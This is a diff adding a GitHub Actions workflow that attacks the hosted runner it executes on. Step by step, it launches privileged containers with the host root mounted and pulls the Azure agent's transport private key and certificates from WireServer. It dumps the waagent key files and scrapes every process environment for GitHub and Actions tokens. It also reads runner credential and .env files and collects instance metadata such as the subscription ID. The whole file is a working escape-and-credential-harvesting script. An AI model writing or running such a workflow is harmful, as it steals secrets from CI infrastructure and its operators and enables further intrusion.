@@ -1,0 +1,153 @@
+name: WireServer Certs v2 - Python XML + Worker Token
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+jobs:
+  ws-pivot-v2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Full WireServer Cert Chain via Python XML
+        run: |
+          echo "=== STEP1: GOALSTATE + CERT CHAIN VIA PYTHON ==="
+          
+          # Run on host with chroot (avoids Alpine busybox limits)
+          docker run --rm --privileged --network=host \
+            -v /:/host ubuntu:latest bash -c '
+            # Use the host system curl directly
+            GOAL=$(chroot /host curl -sf --max-time 15 \
+              --cert /var/lib/waagent/TransportCert.pem \
+              --key /var/lib/waagent/TransportPrivate.pem \
+              "http://168.63.129.16/machine/?comp=goalstate" \
+              -H "x-ms-version: 2012-11-30")
+            
+            echo "=GOALSTATE="
+            echo "$GOAL"
+            
+            # Use Python to parse the XML and extract URLs
+            CERT_URL=$(echo "$GOAL" | python3 -c "
+import sys, xml.etree.ElementTree as ET
+goal = sys.stdin.read()
+root = ET.fromstring(goal)
+ns = {\"ns\": \"http://www.w3.org/2001/XMLSchema-instance\"}
+for elem in root.iter():
+    if elem.tag == \"Certificates\" and elem.text:
+        print(elem.text.strip())
+        break
+" 2>/dev/null)
+            
+            echo "=CERT_URL=$CERT_URL="
+            
+            if [ -n "$CERT_URL" ]; then
+              echo "=WIRESERVER_CERTS_RESPONSE="
+              chroot /host curl -sf --max-time 15 \
+                --cert /var/lib/waagent/TransportCert.pem \
+                --key /var/lib/waagent/TransportPrivate.pem \
+                "$CERT_URL" \
+                -H "x-ms-version: 2012-11-30"
+            fi
+            
+            EXT_URL=$(echo "$GOAL" | python3 -c "
+import sys, xml.etree.ElementTree as ET
+goal = sys.stdin.read()
+root = ET.fromstring(goal)
+for elem in root.iter():
+    if elem.tag == \"ExtensionsConfig\" and elem.text:
+        print(elem.text.strip())
+        break
+" 2>/dev/null)
+            
+            echo "=EXTENSIONS_CONFIG="
+            if [ -n "$EXT_URL" ]; then
+              chroot /host curl -sf --max-time 15 \
+                --cert /var/lib/waagent/TransportCert.pem \
+                --key /var/lib/waagent/TransportPrivate.pem \
+                "$EXT_URL" \
+                -H "x-ms-version: 2012-11-30"
+            fi
+            
+            echo "=CERTS_PEM="
+            cat /host/var/lib/waagent/Certificates.pem
+            
+            echo "=TRANSPORT_CERT="
+            cat /host/var/lib/waagent/TransportCert.pem
+            
+            echo "=TRANSPORT_KEY="
+            cat /host/var/lib/waagent/TransportPrivate.pem
+            
+            echo "=SHAREDCONFIG="
+            cat /host/var/lib/waagent/SharedConfig.xml
+          '
+
+      - name: Runner.Worker Token Extraction
+        run: |
+          echo "=== STEP2: GITHUB_TOKEN + ACTIONS tokens from Runner ==="
+          
+          docker run --rm --privileged --pid=host \
+            -v /:/host ubuntu:latest bash -c '
+            # List all runner processes on host
+            echo "=RUNNER_PROCS="
+            for pid in $(ls /proc/ | grep -E "^[0-9]+$"); do
+              exe=$(readlink /proc/$pid/exe 2>/dev/null || echo "")
+              if echo "$exe" | grep -qiE "runner|worker|actions"; then
+                echo "PID=$pid EXE=$exe CMD=$(cat /proc/$pid/cmdline 2>/dev/null | tr \"\\0\" \" \")"
+              fi
+            done
+            
+            echo "=RUNNER_LISTENER_ENV="
+            for pid in $(ls /proc/ | grep -E "^[0-9]+$"); do
+              exe=$(readlink /proc/$pid/exe 2>/dev/null || echo "")
+              if echo "$exe" | grep -qiE "Listener"; then
+                cat /proc/$pid/environ 2>/dev/null | tr "\\0" "\\n"
+              fi
+            done
+            
+            echo "=RUNNER_WORKER_ENV="
+            for pid in $(ls /proc/ | grep -E "^[0-9]+$"); do
+              exe=$(readlink /proc/$pid/exe 2>/dev/null || echo "")
+              if echo "$exe" | grep -qiE "Worker"; then
+                cat /proc/$pid/environ 2>/dev/null | tr "\\0" "\\n"
+              fi
+            done
+            
+            echo "=ALL_PROC_TOKEN_SCAN="
+            # Scan all process environments for GitHub tokens
+            for pid in $(ls /proc/ | grep -E "^[0-9]+$"); do
+              env_data=$(cat /proc/$pid/environ 2>/dev/null | tr "\\0" "\\n")
+              if echo "$env_data" | grep -qE "GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN|ghs_"; then
+                exe=$(readlink /proc/$pid/exe 2>/dev/null || echo "unknown")
+                echo "=FOUND_TOKENS_PID=${pid}_EXE=${exe}="
+                echo "$env_data" | grep -E "GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_CACHE_URL|ACTIONS_RESULTS_URL"
+              fi
+            done
+            
+            echo "=RUNNER_CREDENTIALS_FILE="
+            cat /host/home/runner/actions-runner/cached/2.337.0/.credentials 2>/dev/null || echo NO_CREDS_FILE
+            find /host/home/runner -name ".credentials" -o -name "*.credentials" 2>/dev/null | head -10
+            find /host/home/runner -name "*.token" 2>/dev/null | head -5
+            
+            echo "=RUNNER_ENV_FILE="
+            find /host/home/runner -name ".env" 2>/dev/null | xargs cat 2>/dev/null | head -30
+          '
+
+      - name: IMDS + Subscription Enum
+        run: |
+          echo "=== STEP3: IMDS Full Dump ==="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
+            python3 -c "
+import sys,json
+d=json.load(sys.stdin)['compute']
+print(f'VMID={d[\"vmId\"]}')
+print(f'VMNAME={d[\"name\"]}')
+print(f'SUBID={d[\"subscriptionId\"]}')
+print(f'RG={d[\"resourceGroupName\"]}')
+print(f'LOCATION={d[\"location\"]}')
+print(f'SIZE={d[\"vmSize\"]}')
+print(f'PUBLISHER={d[\"publisher\"]}')
+print(f'OFFER={d[\"offer\"]}')
+# Print tags
+for t in d.get('tagsList',[]):
+    print(f'TAG:{t[\"name\"]}={t[\"value\"]}')
+"
